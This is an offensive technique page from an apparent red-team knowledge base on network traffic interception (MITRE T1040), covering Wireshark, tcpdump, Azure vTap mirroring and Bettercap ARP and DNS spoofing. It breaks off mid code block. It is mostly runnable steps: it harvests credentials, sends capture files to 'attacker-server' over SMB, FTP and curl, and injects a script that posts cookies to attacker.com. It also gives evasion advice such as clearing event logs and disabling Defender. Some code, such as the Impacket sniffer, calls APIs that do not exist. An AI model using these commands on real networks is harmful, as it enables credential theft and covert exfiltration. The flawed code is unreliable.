# [COLLECT-NETWORK-001]: Network Traffic Interception

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | COLLECT-NETWORK-001 |
| **MITRE ATT&CK v18.1** | [T1040 - Network Sniffing](https://attack.mitre.org/techniques/T1040/) |
| **Tactic** | Collection |
| **Platforms** | Multi-Env (Windows, Azure, On-Premises, Linux) |
| **Severity** | High |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | All Windows versions (2016+), Azure VMs, Linux all distributions |
| **Patched In** | N/A (Technique requires infrastructure/network access, not inherent vulnerability) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Network traffic interception is the passive or active capture of network communications between systems to harvest sensitive data including credentials, session tokens, configuration details, and authentication material. Adversaries exploit the fundamental principle that much network traffic, particularly at the load balancer level in cloud environments, traverses networks in cleartext due to TLS termination for performance optimization. By placing a network interface into **promiscuous mode**, accessing **SPAN ports**, or leveraging **cloud-native traffic mirroring services** (Azure vTap, AWS Traffic Mirroring, GCP Packet Mirroring), attackers can passively monitor all traffic without modifying packets, making this a stealthy reconnaissance and data harvesting technique.

**Attack Surface:** Network interfaces in physical/hybrid networks, cloud virtual networking interfaces, traffic mirroring services, SPAN port configurations, wireless networks, and DNS/NetBIOS services operating over unencrypted protocols.

**Business Impact:** **Complete compromise of authentication material, intellectual property theft, and lateral movement enablement.** An attacker capturing even a single unencrypted HTTP Basic Auth header or DNS query can pivot to any system the captured credential has access to. In cloud environments, this enables harvesting of API tokens, managed identity credentials, and service-to-service authentication tokens. This technique has been observed in APT campaigns (APT28 via Responder, DarkVishnya credential theft, Sandworm Team password sniffing) and is fundamental to adversary-in-the-middle (AiTM) operations.

**Technical Context:** Network sniffing can occur passively with zero detectable artifacts if using cloud traffic mirroring. Traditional host-based sniffing using tcpdump or Wireshark generates process execution events but operates below most endpoint detection layers if execution is from a legitimate utility. In cloud, traffic can be exfiltrated silently via vTap mirrors redirected to attacker-controlled instances. Typical detection latency is hours to days, as most organizations do not monitor for NIC promiscuous mode changes or traffic mirror creation in real-time.

### Operational Risk
- **Execution Risk:** Low – Passive sniffing requires no privilege escalation, only network access. Active interception (MITM) requires ARP spoofing or network position, increasing detection risk.
- **Stealth:** Medium-High (passive) / Low (active with ARP spoofing) – Passive captures leave minimal forensic evidence. Active MITM generates ARP traffic and connection interruptions.
- **Reversibility:** N/A – This is pure data capture; no system modifications required.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 2.1.1, 2.1.2 | Ensure encryption in transit for all network communications; implement network segmentation to restrict broadcasts and multicast sniffing |
| **DISA STIG** | Windows Server: V-254390, V-254391 | Ensure legacy protocols (LLMNR, NBT-NS) are disabled; enforce Kerberos as primary authentication mechanism |
| **NIST 800-53** | SC-7 (Boundary Protection), SC-8 (Transmission Confidentiality) | Encrypt all external communications; monitor for unauthorized network access |
| **GDPR** | Article 32 | Technical and organizational measures for security of processing (encryption, monitoring) |
| **DORA** (EU Finance) | Article 9 | Incident Detection and Response – must detect unauthorized network monitoring |
| **NIS2** (EU Critical Infrastructure) | Article 21 | Cyber Risk Management – implement network segmentation and encryption of sensitive data |
| **ISO 27001** | A.8.1.1, A.10.1.1 | Network access controls; encryption of sensitive data in transit |
| **ISO 27005** | Risk Assessment Scenario | "Unauthorized Network Eavesdropping" – likelihood high if unencrypted protocols in use |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:**
- **On-Premises (Windows):** Local Administrator (for NIC promiscuous mode) or User with Network Administrator rights for SPAN port configuration.
- **Azure/Cloud:** Virtual Machine Contributor or higher to create traffic mirrors; Reader privilege on target resources to enumerate vTap eligibility.

**Required Access:**
- Network access to the target segment (same VLAN for passive sniffing, or attacker-controlled network position for ARP spoofing).
- Ability to execute network capture tools (tcpdump, Wireshark, bettercap).

**Supported Versions:**
- **Windows:** Server 2016, 2019, 2022, 2025 (all versions support NIC promiscuous mode via network drivers).
- **Linux:** All distributions (tcpdump, libpcap standard).
- **Azure:** All VM SKUs and sizes support traffic mirroring via vTap (requires az CLI or Portal access).
- **PowerShell:** 5.0+ for Az module cmdlets (Create-AzNetworkWatcher, New-AzNetworkWatcherPacketCapture).

**Tools:**
- [Wireshark](https://www.wireshark.org/) (Version 4.0+) – GUI packet capture and analysis.
- [tcpdump](https://www.tcpdump.org/) (Version 4.99.0+) – CLI packet capture (Linux/BSD/macOS).
- [Bettercap](https://www.bettercap.org/) (Version 2.30+) – Active MITM and ARP spoofing framework.
- [Impacket](https://github.com/SecureAuthCorp/impacket) (Version 0.11.0+) – Network sniffer via raw sockets.
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) (Version 2.55.0+) – Cloud traffic mirror provisioning.

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Windows Promiscuous Mode Check

```powershell
# Check if network adapter supports promiscuous mode
Get-NetAdapter | Select-Object Name, InterfaceDescription, MacAddress

# Attempt to place NIC into promiscuous mode (requires Admin)
# This requires WinPcap or Npcap driver installation first
```

**What to Look For:**
- Network adapters with driver version supporting raw sockets (Npcap v1.0+).
- Virtual adapters (Hyper-V switch ports) which often allow promiscuous mode without Admin.
- Wireless adapters in monitor mode capability.

**Version Note:** Server 2022+ restricts some promiscuous mode operations without Kernel Mode Driver signing; use Npcap instead of WinPcap.

**Command (Server 2016-2019):**
```powershell
# WinPcap compatibility check
Get-Package | Where-Object {$_.Name -like "*WinPcap*"}
```

**Command (Server 2022+):**
```powershell
# Npcap compatibility check (modern replacement)
Get-Package | Where-Object {$_.Name -like "*Npcap*"}
```

### Azure Traffic Mirror Enumeration

```bash
# List all VMs eligible for vTap traffic mirroring
az vm list --query "[].{Name:name, ResourceGroup:resourceGroup, NetworkInterface:networkProfile.networkInterfaces[0].id}"

# Check if Network Watcher is enabled in region
az network watcher list --query "[].{Name:name, ProvisioningState:provisioningState}"
```

**What to Look For:**
- Azure regions with active Network Watcher instances (required for vTap).
- VM network interfaces not already in traffic mirror targets.
- Service Principal with "Network Contributor" role to create vTap resources.

### Linux Network Sniffer Verification

```bash
# Verify tcpdump availability
which tcpdump
tcpdump --version

# Check libpcap library for raw socket capture
ldconfig -p | grep libpcap

# Enumerate network interfaces for capture eligibility
ip addr show
ifconfig  # Older systems
```

**What to Look For:**
- libpcap version 1.8.1+ for modern filter expressions.
- Network interfaces with IP addresses on target subnets.
- Root or CAP_NET_RAW capability for raw socket access.

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Windows Network Traffic Capture via Wireshark (GUI-Based)

**Supported Versions:** Server 2016-2025, Windows 10/11

#### Step 1: Install Npcap Driver

**Objective:** Establish the kernel-mode packet capture driver required for network interface access.

**Prerequisites:** Administrator privileges, system reboot required.

**Command (PowerShell as Administrator):**
```powershell
# Download Npcap installer
Invoke-WebRequest -Uri "https://npcap.com/dist/npcap-1.73.exe" -OutFile "C:\Temp\npcap-installer.exe"

# Execute silent installation with WinPcap compatibility mode
& "C:\Temp\npcap-installer.exe" /S /loopback_support=yes /dlt_null=yes /admin_only=no
```

**Version Note:** Server 2022+ requires Npcap v1.70+ due to Driver Signature Enforcement (DSE) changes.

**Command (Server 2022+):**
```powershell
# Npcap v1.73+ is DSE-signed; WinPcap will fail
Invoke-WebRequest -Uri "https://npcap.com/dist/npcap-1.73.exe" -OutFile "C:\Temp\npcap-latest.exe"
& "C:\Temp\npcap-latest.exe" /S  # DSE-signed, no special flags needed
```

**Expected Output:**
```
Installation completed successfully
Npcap driver installed and running
```

**OpSec & Evasion:**
- Installer execution will appear in Security Event Log (EventID 4688). Clear logs post-capture.
- Use silent installation flag `/S` to avoid GUI popup (less conspicuous than GUI installer).
- Disable Windows Defender real-time scanning temporarily to avoid driver quarantine.

**Troubleshooting:**
- **Error:** "Driver failed to load – DSE verification failed"
  - **Cause:** Kernel Mode Driver Signature Enforcement on Server 2022+.
  - **Fix (Server 2016-2019):** Downgrade to WinPcap 4.1.3 (older, unsigned).
  - **Fix (Server 2022+):** Use Npcap v1.71+ which is digitally signed by Insecure.

#### Step 2: Launch Wireshark and Select Network Interface

**Objective:** Open Wireshark and identify the target network interface for capture.

**Command:**
```powershell
# Launch Wireshark (assumes installed via chocolatey or MSI)
& "C:\Program Files\Wireshark\Wireshark.exe"
```

**Manual GUI Steps:**
1. Open **Wireshark** → **Capture** → **Interfaces**
2. Review list of available interfaces (Ethernet, Wi-Fi, VPN, etc.)
3. Select the interface connected to target network (e.g., "Ethernet 2")
4. **Optional:** Click the **Gear icon** next to interface to enable **Monitor Mode** (if wireless)

**Expected Output:**
```
Available Interfaces:
  1. Ethernet (Intel I210 Gigabit Network Connection)
  2. Wi-Fi (Intel Wireless-AC 9260)
  3. Loopback (Adapter for loopback traffic capture)
  4. VPN Adapter (OpenVPN Adapter)
```

**What This Means:**
- **Ethernet 1** is typically the management interface (avoid this to remain stealthy).
- **Ethernet 2** or higher are secondary NICs (ideal for SPAN port mirrors or isolated capture).
- **Loopback** shows local machine traffic (less useful for lateral movement reconnaissance).

#### Step 3: Apply Capture Filters

**Objective:** Reduce noise by capturing only relevant traffic (e.g., authentication protocols, cleartext credentials).

**Command (in Wireshark Capture Filter field):**
```
tcp port 80 or tcp port 3389 or tcp port 445 or tcp port 21 or tcp port 23 or tcp port 25 or tcp port 110
```

**Alternative Filter (Credentials in Transit):**
```
tcp.port == 80 or tcp.port == 8080 or tcp.port == 21 or tcp.port == 110 or tcp.port == 25
```

**Manual GUI Steps:**
1. In Wireshark: **Capture** → **Capture Filters**
2. Click **+** to create new filter
3. Name: `Cleartext Protocols`
4. Filter expression: Paste one of the above filters
5. Click **OK**

**Expected Behavior:**
- Only packets matching the filter expression are captured (reduces file size, increases signal-to-noise).
- HTTP packets will show "Basic Auth" headers with base64-encoded credentials.
- FTP packets will show plaintext username and password in data payload.
- SMTP packets will contain message content and sender/recipient.

**OpSec & Evasion:**
- Avoid capturing on the management VLAN where administrative traffic flows.
- Redirect capture output to a hidden directory: `C:\$Recycle.Bin\capture.pcapng` (requires post-exploitation modification of NTFS permissions).

**Troubleshooting:**
- **Error:** "No Packets Captured"
  - **Cause:** Filter is too restrictive or wrong interface selected.
  - **Fix (Server 2016-2019):** Remove filter entirely; start with unfiltered capture.
  - **Fix (Server 2022+):** Ensure Npcap is running: `Get-Service npcap | Select-Object Status`.

#### Step 4: Start Capture and Monitor Live Traffic

**Objective:** Begin packet capture and visually inspect captured credentials/tokens in real-time.

**Manual GUI Steps:**
1. Click the **Start Capture** button (blue shark fin icon) in Wireshark.
2. Wait for traffic to appear in the packet list (top panel).
3. Click on any packet to inspect its details (middle panel).
4. Scroll to "Data" tab (bottom panel) to view payload content.

**Expected Output:**
```
Frame 1234: 152 bytes on wire (1216 bits), 152 bytes captured (1216 bits)
Ethernet II, Src: aa:bb:cc:dd:ee:ff, Dst: 11:22:33:44:55:66
  Internet Protocol Version 4, Src: 192.168.1.100, Dst: 192.168.1.50
    Transmission Control Protocol, Src Port: 54321, Dst Port: 80
      Hypertext Transfer Protocol
        GET /admin HTTP/1.1
        Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQxMjM=
```

**What This Means:**
- The "Authorization: Basic" header contains base64-encoded credentials.
- Decoding `dXNlcm5hbWU6cGFzc3dvcmQxMjM=` reveals `username:password123`.
- This can be extracted and used for lateral movement.

**Credential Extraction:**
```powershell
# Decode captured Base64 Auth header
[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("dXNlcm5hbWU6cGFzc3dvcmQxMjM="))
# Output: username:password123
```

#### Step 5: Export Captured Packets and Exfiltrate

**Objective:** Save the capture file and move it off the target system for analysis.

**Manual GUI Steps:**
1. Click **File** → **Save As**
2. Choose save location (preferably hidden): `C:\Windows\Temp\report.pcapng`
3. Format: Select **Wireshark/tcpdump (*.pcapng)**
4. Click **Save**

**Command (PowerShell - Copy to SMB Share for Exfil):**
```powershell
# Stop capture first, then copy
Copy-Item -Path "C:\Windows\Temp\report.pcapng" -Destination "\\attacker-server\share\captures\report.pcapng"
```

**Command (Exfil via FTP):**
```powershell
# Connect to attacker FTP server and upload
$ftp = New-Object System.Net.FtpWebRequest("ftp://attacker-server/report.pcapng")
$ftp.Credentials = New-Object System.Net.NetworkCredential("anonymous", "")
$ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile

$fileStream = [System.IO.File]::OpenRead("C:\Windows\Temp\report.pcapng")
$ftp.GetRequestStream().Write($fileStream.ToArray(), 0, $fileStream.Length)
$ftp.GetResponse()
```

**OpSec & Evasion:**
- Use UNC paths (`\\servername\share`) instead of mapped drives to avoid registry artifacts.
- Delete the capture file after exfiltration: `Remove-Item -Path "C:\Windows\Temp\report.pcapng" -Force`.
- Clear Event Logs (EventID 4663 - Object Accessed) if File Auditing is enabled.

---

### METHOD 2: Linux Network Sniffing via tcpdump (CLI-Based)

**Supported Versions:** All Linux distributions, BSD, macOS

#### Step 1: Verify tcpdump Availability and Permissions

**Objective:** Confirm tcpdump binary exists and user has CAP_NET_RAW capability or root access.

**Command:**
```bash
# Check tcpdump binary location
which tcpdump
tcpdump --version

# Verify libpcap support
ldconfig -p | grep libpcap

# Check current user capabilities
getcap -r / 2>/dev/null | grep tcpdump
# or
sudo -l | grep tcpdump  # Check sudo permissions
```

**Expected Output:**
```
tcpdump version 4.99.4
libpcap version 1.11.0
/usr/bin/tcpdump = cap_net_raw,cap_net_admin+ep  (Excellent - no sudo needed)
```

**What to Look For:**
- libpcap v1.8.1+ for advanced filter expressions.
- tcpdump with CAP_NET_RAW and CAP_NET_ADMIN capabilities (avoids needing sudo, less logged).
- If no capabilities, check `sudo -l` for passwordless tcpdump execution.

#### Step 2: Craft Selective Capture Filter

**Objective:** Define a filter expression to capture only authentication and credential traffic.

**Command (Capture HTTP Basic Auth):**
```bash
sudo tcpdump -i eth0 'tcp port 80 and (tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x48545450)' -w /tmp/http_capture.pcap
```

**Command (Capture DNS Queries - Privacy Reconnaissance):**
```bash
sudo tcpdump -i eth0 'udp port 53' -w /tmp/dns_capture.pcap
```

**Command (Capture SMB Traffic - Credential Relay Opportunity):**
```bash
sudo tcpdump -i eth0 'tcp port 445 or tcp port 139' -w /tmp/smb_capture.pcap
```

**Command (Capture All on Interface without sudo - if CAP_NET_RAW set):**
```bash
# No sudo required if capabilities are set properly
tcpdump -i eth0 -w /tmp/all_traffic.pcap
```

**Version Note:** Linux kernel 4.18+ supports eBPF filters for more efficient capture.

**Command (Server 2016-equivalent Linux with eBPF):**
```bash
# Modern libpcap with eBPF JIT compilation
tcpdump -i eth0 'tcp port 80 or tcp port 443 or tcp port 3389' -w capture.pcap --jit off  # Disable JIT for compatibility
```

**Expected Behavior:**
- Filter expression is compiled to BPF bytecode by libpcap.
- Only packets matching filter reach userspace (kernel-level filtering reduces CPU).
- Output file grows at rate proportional to matching traffic (typically 1-10 MB/min on busy network).

#### Step 3: Capture Credentials in Real-Time

**Objective:** Sniff traffic and immediately grep for sensitive patterns (passwords, tokens, API keys).

**Command (Stream credentials to stdout):**
```bash
sudo tcpdump -i eth0 -A -l 'tcp port 80 or tcp port 8080' | grep -i 'Authorization\|password\|token\|api'
```

**Command (Capture and parse FTP credentials):**
```bash
sudo tcpdump -i eth0 -A 'tcp port 21' | grep -oP '(USER|PASS) \K.*'
```

**Command (Extract HTTP Basic Auth headers):**
```bash
sudo tcpdump -i eth0 -A 'tcp port 80' | grep -oP 'Authorization: Basic \K[^ ]+'  | while read cred; do echo "$cred" | base64 -d; echo; done
```

**OpSec & Evasion:**
- Use `-l` flag to flush output immediately (avoids buffering delays if process is killed).
- Capture to a hidden file: `/tmp/.capture.pcap` or `/dev/shm/capture.pcap` (RAM disk, no disk artifacts).
- Avoid process name "tcpdump" in monitoring; use `exec` to replace current process: `exec tcpdump -i eth0 ...`.

**Expected Output:**
```
Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQxMjM=
USER admin
PASS P@ssw0rd!
TOKEN eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

#### Step 4: Convert Capture to Analyzable Format and Exfiltrate

**Objective:** Export captured data in a portable format (PCAP-NG) and move it off-target.

**Command (Convert to standard PCAP for compatibility):**
```bash
# tcpdump saves as PCAP-NG by default; convert to PCAP for legacy tools
tcpdump -r /tmp/http_capture.pcap -w /tmp/http_capture_legacy.pcap
```

**Command (Exfiltrate via curl/wget):**
```bash
# Send via HTTP POST
curl -X POST --data-binary @/tmp/http_capture.pcap http://attacker-server:8080/exfil

# or via scp (if SSH available)
scp /tmp/http_capture.pcap attacker@attacker-server:/tmp/
```

**Command (Base64-encode for obfuscation during exfil):**
```bash
cat /tmp/http_capture.pcap | base64 | curl -X POST -d @- http://attacker-server:8080/b64
```

**OpSec & Evasion:**
- Delete capture after exfil: `shred -vfz -n 3 /tmp/http_capture.pcap` (secure overwrite).
- Exfil over HTTPS to avoid IDS signature matches on PCAP magic bytes (`0xd4 0xc3 0xb2 0xa1`).

---

### METHOD 3: Azure Traffic Mirroring via vTap (Cloud-Native)

**Supported Versions:** All Azure regions with Network Watcher

#### Step 1: Enumerate Target VMs and Create Network Watcher

**Objective:** Identify VMs with interesting traffic and establish the network monitoring infrastructure.

**Command (Azure CLI):**
```bash
# List all VMs in current subscription
az vm list --query "[].{Name:name, ResourceGroup:resourceGroup, PublicIP:publicIps}"

# Check if Network Watcher exists in target region
az network watcher list --query "[?location=='eastus']"

# Create Network Watcher if missing
az network watcher create --resource-group <RG> --location eastus --name NetworkWatcher_eastus
```

**Command (PowerShell):**
```powershell
# Get all VMs
Get-AzVM | Select-Object Name, ResourceGroupName, Location

# Create Network Watcher via PowerShell
$rg = "MyResourceGroup"
New-AzNetworkWatcher -Name "NetworkWatcher_eastus" -ResourceGroupName $rg -Location "eastus"
```

**Expected Output:**
```json
{
  "name": "NetworkWatcher_eastus",
  "resourceGroup": "MyResourceGroup",
  "location": "eastus",
  "provisioningState": "Succeeded"
}
```

**Version Note:** Network Watcher is free; traffic mirroring incurs minimal egress costs. All Azure regions support this as of 2024.

#### Step 2: Create Traffic Mirror Target (Destination VM)

**Objective:** Set up an attacker-controlled Azure VM to receive mirrored traffic.

**Command (Create minimal Linux VM for capture):**
```bash
# Create resource group for attacker infrastructure
az group create --name "AttackerRG" --location eastus

# Create minimal Linux VM (tcpdump pre-installed)
az vm create \
  --resource-group AttackerRG \
  --name CapturVM \
  --image UbuntuLTS \
  --size Standard_B1s \
  --admin-username azureuser \
  --generate-ssh-keys \
  --public-ip-address-allocation static
```

**Command (Install tcpdump on target if not present):**
```bash
# SSH into capture VM and install
ssh azureuser@<public-ip>
sudo apt-get update && sudo apt-get install -y tcpdump tshark

# Start capturing on background
sudo nohup tcpdump -i eth0 -w /tmp/mirror.pcap > /dev/null 2>&1 &
```

**Expected Output:**
```
CapturVM successfully created
Public IP: 40.123.45.67
SSH: ssh azureuser@40.123.45.67
```

#### Step 3: Create Traffic Mirror Session

**Objective:** Configure vTap to redirect traffic from target VMs to the attacker capture VM.

**Command (Create Traffic Mirror Target - Destination NIC):**
```bash
# Get destination VM's NIC ID
DEST_NIC=$(az vm show -d -g AttackerRG -n CapturVM --query 'networkProfile.networkInterfaces[0].id' -o tsv)

# Create Traffic Mirror Target
az network vnet tap create \
  --resource-group AttackerRG \
  --name "MirrorTarget" \
  --destination "$DEST_NIC"
```

**Command (Create Traffic Mirror Source - Source VM's NIC):**
```bash
# Get source VM's NIC ID
SOURCE_NIC=$(az vm show -d -g SourceRG -n SourceVM --query 'networkProfile.networkInterfaces[0].id' -o tsv)

# Attach source NIC to mirror target
az network nic ip-config vtap add \
  --resource-group SourceRG \
  --nic-name $(basename $SOURCE_NIC) \
  --ip-config-name ipconfig1 \
  --tap "/subscriptions/<subscription>/resourceGroups/AttackerRG/providers/Microsoft.Network/virtualNetworkTaps/MirrorTarget"
```

**Expected Output:**
```
Successfully created vTap mirror
Source: SourceVM NIC
Destination: CapturVM NIC
Traffic Direction: Ingress + Egress
```

**What This Means:**
- All traffic entering/exiting SourceVM is now duplicated to CapturVM.
- The mirroring is transparent to SourceVM (no performance impact, no security alerts from OS).
- No PKI certificates needed; mirror operates at NIC driver level.

#### Step 4: Analyze Mirrored Traffic and Exfiltrate

**Objective:** Use standard PCAP analysis tools on captured traffic without touching the source VM.

**Command (Analyze captured PCAP on attacker VM):**
```bash
# Download capture from target to attacker workstation
ssh azureuser@<attacker-ip> 'sudo cat /tmp/mirror.pcap' | wireshark -i - &

# or use tshark for CLI analysis
ssh azureuser@<attacker-ip> 'sudo tshark -r /tmp/mirror.pcap -Y "http.request.method==POST" -T fields -e frame.time -e ip.src -e ip.dst -e http.request.full_uri'
```

**Command (Extract credentials from mirror):**
```bash
# Filter HTTP Basic Auth headers
tshark -r /tmp/mirror.pcap -Y "http.request" -e http.request.header.name -e http.request.header.value | grep -i authorization
```

**OpSec & Evasion:**
- vTap mirrors do not generate Security events in target VM audit logs.
- No EventID 4688 (Process Creation) – the mirror is configured via ARM API.
- Mirror activities log to Azure Activity Log with minimal detail (very high noise-to-signal ratio).
- Clean up by deleting the vTap: `az network vnet tap delete --resource-group AttackerRG --name MirrorTarget`.

**Troubleshooting:**
- **Error:** "Cannot attach NIC to vTap – NIC already has maximum taps"
  - **Cause:** Azure limit is 10 vTaps per NIC.
  - **Fix:** Select different source NICs or delete old unused taps.
- **Error:** "vTap and source NIC not in same vNet"
  - **Cause:** Cross-vNet traffic mirroring not supported.
  - **Fix:** Both VMs must be in same virtual network and region.

---

### METHOD 4: Active MITM via Bettercap (LAN Poisoning & Credential Capture)

**Supported Versions:** Windows 10+, Linux all distributions, macOS

#### Step 1: Install and Configure Bettercap

**Objective:** Deploy the active MITM framework with ARP spoofing and DNS poisoning.

**Command (Linux - apt):**
```bash
sudo apt-get update && sudo apt-get install -y bettercap
```

**Command (Windows - via Go binary):**
```powershell
# Download pre-compiled binary
Invoke-WebRequest -Uri "https://github.com/bettercap/bettercap/releases/download/v2.32.0/bettercap_windows_amd64.zip" -OutFile "C:\Temp\bettercap.zip"
Expand-Archive -Path "C:\Temp\bettercap.zip" -DestinationPath "C:\Temp\bettercap"

# Launch (requires Admin, requires WinPcap/Npcap installed first)
cd C:\Temp\bettercap
.\bettercap.exe -iface "Ethernet 2"
```

**Command (macOS - via Homebrew):**
```bash
brew install bettercap
```

**Version Note:** Bettercap v2.30+ required for modern encryption bypass techniques.

#### Step 2: Identify Target Hosts on LAN

**Objective:** Enumerate network topology and identify interesting targets.

**Interactive Bettercap Session (bash):**
```bash
sudo bettercap -iface eth0

# In bettercap interactive prompt:
> help
> net.probe on
```

**Expected Output:**
```
[*] Starting network probe...
192.168.1.1     08:00:27:9c:d6:90 (Gateway)
192.168.1.50    52:54:00:12:34:56 (Windows Server 2022)
192.168.1.75    52:54:00:ab:cd:ef (Linux Workstation)
192.168.1.100   52:54:00:11:22:33 (Unknown - Target)
```

**What to Look For:**
- Windows systems (.1.50, .1.75) – likely running legacy protocols.
- Servers with predictable IP ranges (.1.1-.1.10 = infrastructure).
- Clients in DHCP range (.1.100+) – less hardened, higher chance of cleartext protocols.

#### Step 3: Launch ARP Spoofing Attack

**Objective:** Position attacker as man-in-the-middle between target and gateway.

**Bettercap Commands:**
```
> set arp.spoof.targets 192.168.1.100
> arp.spoof on
> net.sniff on
```

**What This Does:**
1. Sends gratuitous ARP replies claiming attacker's MAC = gateway's MAC.
2. Traffic from 192.168.1.100 destined for gateway goes to attacker instead.
3. Attacker forwards traffic to real gateway (transparent pass-through).
4. All traffic is now visible to attacker's sniffer.

**OpSec & Evasion:**
- ARP spoofing generates detectable ARP broadcasts. Use tool on network segment with high traffic noise.
- Minimize spoof duration (<5 minutes) to reduce detection likelihood.
- Use `-X` flag to avoid gateway restoration; attacker interface will become primary gateway.

**Expected Output:**
```
[*] Spoofing 192.168.1.100...
[*] Packets captured: 1234
[+] New GET request: http://192.168.1.50/admin
[+] Authorization header detected: Basic dXNlcm5hbWU6cGFzc3dvcmQ=
```

#### Step 4: DNS Spoofing (Redirect Traffic)

**Objective:** Redirect target's DNS queries to attacker-controlled IP (e.g., rogue webserver).

**Bettercap Commands:**
```
> set dns.spoof.domains example.com
> set dns.spoof.address 192.168.1.99  # Attacker IP
> dns.spoof on
```

**Interactive Setup (for credential harvesting):**
```bash
# Create fake HTTP server on attacker machine listening on port 80
sudo python3 -m http.server 80 --directory /tmp/fake_site

# In bettercap, configure spoofing
> set dns.spoof.domains amazon.com,gmail.com,outlook.office.com
> set dns.spoof.address 192.168.1.99
> dns.spoof on
```

**Expected Output:**
```
[*] DNS spoofing active
example.com -> 192.168.1.99
[+] Target 192.168.1.100 requested example.com
[*] Redirecting to 192.168.1.99
[+] Target now viewing fake site at 192.168.1.99
```

**Use Case (Credential Harvesting):**
- When target browses to `amazon.com`, redirect to attacker's fake login page.
- Attacker logs credentials to file as users enter them.

#### Step 5: Proxy Interception & Payload Injection

**Objective:** Intercept and modify HTTP responses (e.g., inject keylogger, downgrade HTTPS).

**Bettercap HTTP Proxy Module:**
```
> set http.proxy on
> set http.proxy.port 8080
> set http.proxy.script /path/to/interceptor.js

# Custom JavaScript to inject payload
cat > /tmp/interceptor.js << 'EOF'
function onRequest(req) {
    // Log all GET requests
    console.log("[+] " + req.method + " " + req.path);
    
    // Inject XSS payload into responses
    if (req.path.includes("/login")) {
        return {
            body: '<script>fetch("http://attacker.com/steal?cookie="+document.cookie)</script>'
        };
    }
}
EOF
```

**Expected Behavior:**
- All HTTP traffic from spoofed target routes through bettercap proxy.
- Custom JavaScript modifies requests/responses in real-time.
- Injected payloads execute in target's browser.

**OpSec & Evasion:**
- HTTPS traffic cannot be easily intercepted without MITM certificate (requires CA cert installation on target).
- Some modern browsers pin certificates, blocking MITM entirely.
- Use only on networks with legacy HTTP services.

---

## 6. TOOLS & COMMANDS REFERENCE

### Wireshark

**Version:** 4.2.2 (latest as of Jan 2025)
**Minimum Version:** 3.0.0 (older versions lack modern encryption support)
**Supported Platforms:** Windows, macOS, Linux

**Installation (Windows):**
```powershell
# Via Chocolatey
choco install wireshark

# Via direct download
Invoke-WebRequest -Uri "https://1.as.dl.wireshark.org/win64/Wireshark-win64-4.2.2.exe" -OutFile "$env:TEMP\wireshark.exe"
& "$env:TEMP\wireshark.exe"
```

**Installation (Linux):**
```bash
sudo apt-get install wireshark
sudo usermod -a -G wireshark $USER  # Add current user to wireshark group
newgrp wireshark  # Activate group membership
```

**Version-Specific Notes:**
- Version 3.x: Supports QUIC, HTTP/3 decryption.
- Version 4.0+: Improved TLS 1.3 dissection, CARP protocol support.
- Version 4.2+: Enhanced cloud network capture support.

**Usage:**
```bash
# GUI launch
wireshark

# CLI capture (tshark)
tshark -i eth0 -w capture.pcapng

# Filter HTTP with credentials
tshark -i eth0 -Y "http.request" -e http.request.header.name -e http.request.header.value
```

### tcpdump

**Version:** 4.99.4 (latest)
**Minimum Version:** 4.99.0
**Supported Platforms:** Linux, BSD, macOS, Windows (via WinDump or Npcap)

**Installation (Linux - Debian/Ubuntu):**
```bash
sudo apt-get install tcpdump
```

**Installation (macOS):**
```bash
# Pre-installed; or via Homebrew
brew install libpcap
```

**Installation (Windows - via Npcap):**
```powershell
# tcpdump is bundled with Npcap
# Download from https://npcap.com/
```

**Version-Specific Behavior:**
- v4.95-4.98: Legacy BPF filter support, no eBPF JIT.
- v4.99+: eBPF JIT compilation for faster filtering.

**Usage (Capture credentials):**
```bash
# Capture Basic Auth headers
tcpdump -i eth0 -A 'tcp port 80 or tcp port 8080' | grep -i 'Authorization'

# Capture DNS queries
tcpdump -i eth0 -A 'udp port 53' -w dns.pcap

# Capture with packet count limit
tcpdump -i eth0 -c 10000 -w capture.pcap
```

### Bettercap

**Version:** 2.32.0 (latest)
**Minimum Version:** 2.30.0 (required for modern MITM techniques)
**Supported Platforms:** Linux, macOS, Windows, Android

**Installation (Linux):**
```bash
# Via package manager
sudo apt-get install bettercap

# Via Go (latest binary)
go install github.com/bettercap/bettercap/cmd/bettercap@latest
```

**Installation (Windows):**
```powershell
# Download pre-compiled binary
wget https://github.com/bettercap/bettercap/releases/download/v2.32.0/bettercap_windows_amd64.zip
Expand-Archive bettercap_windows_amd64.zip -DestinationPath C:\bettercap
cd C:\bettercap
.\bettercap.exe
```

**Version-Specific Changes:**
- v2.27: Added WiFi de-authentication attack module.
- v2.30+: Fixed SSL stripping bypass detection.
- v2.32+: Enhanced HTTP/2 interception.

**Quick Start Commands:**
```bash
# Interactive mode
sudo bettercap -iface eth0

# Scripted mode (non-interactive)
sudo bettercap -iface eth0 -no-colors -eval "net.probe on; sleep(5); net.show; arp.spoof on; net.sniff on"

# Custom configuration file
sudo bettercap -config /path/to/bettercap.conf
```

### Impacket

**Version:** 0.11.0 (latest)
**Minimum Version:** 0.10.0
**Supported Platforms:** Windows, Linux, macOS

**Installation (Linux - via pip):**
```bash
pip3 install impacket
```

**Network Sniffing Module:**
```python
from impacket.ImpactPacket import *

# Packet sniffer using Impacket
def sniff_packets():
    sniffer = ConfPacket()
    sniffer.setfilter("port 80 or port 445")
    
    while True:
        packet = sniffer.next()
        if packet.isHttp():
            print(f"[*] HTTP: {packet.get_full_uri()}")
```

---

## 7. ATOMIC RED TEAM

**Atomic Test ID:** T1040-1
**Test Name:** Network Sniffing via tcpdump (Linux)
**Description:** Capture network traffic using tcpdump on Linux endpoint.
**Supported Platforms:** Linux

**Command:**
```bash
# Atomic test execution
